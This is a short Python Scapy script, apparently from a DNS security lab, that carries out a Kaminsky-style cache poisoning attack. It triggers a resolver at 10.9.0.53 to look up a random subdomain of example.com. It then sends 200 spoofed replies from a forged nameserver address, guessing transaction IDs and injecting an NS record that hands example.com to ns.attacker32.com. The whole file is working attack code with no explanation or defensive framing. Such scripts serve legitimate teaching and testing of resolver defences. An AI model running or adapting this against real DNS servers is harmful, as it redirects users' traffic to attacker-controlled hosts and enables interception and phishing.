#!/usr/bin/env python3
from scapy.all import *


name = str(random.randint(0, 99999)) + ".example.com"

Qdsec = DNSQR(qname=name)
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0,
          nscount=0, arcount=0, qd=Qdsec)

ip  = IP(dst='10.9.0.53', src='10.9.0.1') 
udp = UDP(dport=53, sport=33333, chksum=0)
request = ip/udp/dns
send(request)
print("Sent query for:", name)


base_id   = random.randint(0, 65535)

for i in range(200):
    target_id   = base_id + i
    target_port = 33333

    domain = 'example.com'
    ns     = 'ns.attacker32.com'

    Qdsec  = DNSQR(qname=name)
    Anssec = DNSRR(rrname=name,  type='A',  rdata='1.2.3.4', ttl=259200)
    NSsec  = DNSRR(rrname=domain, type='NS', rdata=ns,       ttl=259200)

    dns = DNS(id=target_id, aa=1, rd=1, qr=1,
            qdcount=1, ancount=1, nscount=1, arcount=0,
            qd=Qdsec, an=Anssec, ns=NSsec)

    ip  = IP(dst='10.9.0.53', src='108.162.192.162')

    udp = UDP(dport=target_port, sport=53, chksum=0)

    reply = ip/udp/dns
    send(reply)